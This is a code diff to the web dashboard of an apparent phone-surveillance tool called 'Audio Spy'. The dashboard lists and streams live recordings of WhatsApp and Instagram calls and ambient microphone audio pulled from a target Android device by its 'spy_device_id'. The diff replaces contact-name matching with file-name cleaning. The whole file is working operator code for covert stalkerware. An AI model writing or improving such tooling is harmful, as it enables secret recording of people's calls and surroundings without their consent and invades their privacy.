@@ -41,7 +41,6 @@
 
         .top-bar { display: flex; justify-content: space-between; align-items: center; }
 
-        /* Back Button Added */
         .back-btn {
             color: var(--text-main); font-size: 1.2rem; text-decoration: none; margin-right: 15px;
         }
@@ -51,7 +50,7 @@
         .live-badge {
             font-size: 0.7rem; 
             background: rgba(48, 209, 88, 0.15);
-            color: var(--accent-green);           
+            color: var(--accent-green);            
             padding: 4px 10px; border-radius: 20px; 
             border: 1px solid rgba(48, 209, 88, 0.3);
             display: flex; align-items: center; gap: 6px;
@@ -159,22 +158,21 @@
         let allRecordings = [];
         let currentFilter = 'All';
         let currentDeviceId = '';
-        let localContacts = []; 
+        
+        // --- ⚡ NO CONTACTS LIST NEEDED NOW ---
+        // Sab naam ab Android App se aayenge
 
-        // --- NEW ID CHECKING SYSTEM (Like Contacts Page) ---
         window.onload = () => {
             const urlParams = new URLSearchParams(window.location.search);
-            const urlID = urlParams.get('id'); // URL se ID uthao
+            const urlID = urlParams.get('id');
 
-            // Agar URL me ID hai, to use karo, warna localStorage check karo
             if (urlID) {
                 currentDeviceId = urlID;
-                localStorage.setItem('spy_device_id', urlID); // Save for later
+                localStorage.setItem('spy_device_id', urlID);
             } else {
                 currentDeviceId = localStorage.getItem('spy_device_id');
             }
 
-            // Agar dono jagah ID nahi mili, to Access Denied
             if (!currentDeviceId) {
                 document.getElementById('accessDenied').style.display = 'flex';
                 return;
@@ -182,57 +180,32 @@
 
             console.log("✅ Loaded Audio Spy for ID:", currentDeviceId);
 
-            // 1. Contacts Load
-            loadLocalContacts();
-
-            // 2. Fetch Audio
+            // 1. Fetch Audio
             fetchHistory();
             joinSocketRoom(currentDeviceId);
         };
 
-        // --- CONTACTS LOADING ---
-        function loadLocalContacts() {
-            const key = `contacts_${currentDeviceId}`;
-            const saved = localStorage.getItem(key);
-            if (saved) {
-                try {
-                    localContacts = JSON.parse(saved);
-                    console.log("Contacts Loaded for Matching:", localContacts.length);
-                } catch (e) { console.error("Error parsing contacts", e); }
-            } else {
-                console.warn("No contacts found in LocalStorage. Names might not show.");
-            }
-        }
-
-        // --- NAME MATCHING LOGIC ---
+        // --- 🧹 CLEAN FILE NAME LOGIC ---
+        // Ye function File Name se "_" aur "Timestamp" hata ke clean naam dikhayega
         function getDisplayName(filename) {
-            if(!filename) return "Unknown";
+            if(!filename) return "Unknown Audio";
 
-            const numberMatch = filename.match(/(\d{6,})/); 
-            
-            if (numberMatch) {
-                let foundNumber = numberMatch[0];
+            // 1. Extension hatao (.m4a, .mp4)
+            let name = filename.replace(/\.[^/.]+$/, "");
 
-                const contact = localContacts.find(c => {
-                    if (!c.number && !c.phone) return false;
-                    let cNum = (c.number || c.phone).replace(/\D/g, '');
-                    let fileNum = foundNumber.replace(/\D/g, '');
-                    return cNum.includes(fileNum) || fileNum.includes(cNum);
-                });
+            // 2. Underscore se Split karo
+            let parts = name.split('_');
 
-                if (contact && contact.name) {
-                    return `📞 ${contact.name}`;
-                }
-                
-                return `Unknown (${foundNumber})`;
+            // 3. Agar last part TimeStamp (Digits) hai, to hata do
+            // Kyunki Android App bhejta hai: "Buddhu_17453432.m4a"
+            if (parts.length > 1 && /^\d+$/.test(parts[parts.length - 1])) {
+                parts.pop(); 
             }
-            
-            const app = detectApp(filename);
-            if (app === 'WhatsApp') return 'WhatsApp Call';
-            if (app === 'Instagram') return 'Instagram Call';
-            if (app === 'Mic') return 'Ambient Recording';
-            
-            return 'Unknown Recording';
+
+            // 4. Waapas join karo aur Underscores ko Space bana do
+            let cleanName = parts.join(' ');
+
+            return cleanName || "Unknown Call";
         }
 
         socket.on('new-audio', (data) => {
@@ -240,6 +213,7 @@
             
             console.log("🔊 New Audio Received:", data);
             
+            // Ab direct file name use hoga
             const displayName = getDisplayName(data.name || data.filename);
 
             const processed = {
@@ -263,7 +237,6 @@
             document.getElementById('recordingsList').innerHTML = `<div class="status-msg">Syncing Audio Data...</div>`;
 
             try {
-                // Fetch using currentDeviceId
                 const res = await fetch(`/api/audio-history/${currentDeviceId}`);
                 const data = await res.json();
 
@@ -326,7 +299,7 @@
             
             return {
                 app: detectApp(fileName),
-                displayName: getDisplayName(fileName),
+                displayName: getDisplayName(fileName), // Simply clean the name
                 date: d.toLocaleDateString(),
                 time: d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                 url: file.secure_url,
